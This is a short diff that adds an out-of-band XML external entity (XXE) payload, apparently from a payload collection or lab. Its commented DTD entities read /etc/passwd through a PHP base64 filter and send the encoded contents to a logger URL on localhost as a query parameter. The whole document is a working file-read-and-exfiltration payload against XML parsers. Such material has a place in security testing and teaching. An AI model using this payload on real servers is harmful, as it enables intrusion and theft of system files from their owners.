@@ -1,0 +1,5 @@
+<!-- define the file you want to read -->
+<!-- base64 encoded: depends on the vulnerable server running php -->
+<!ENTITY % xxefile SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!-- define where to send the extracted data -->
+<!ENTITY % loadoobent "<!ENTITY &#x25; oob SYSTEM 'http://localhost/logger.php?data=%xxefile;'>">
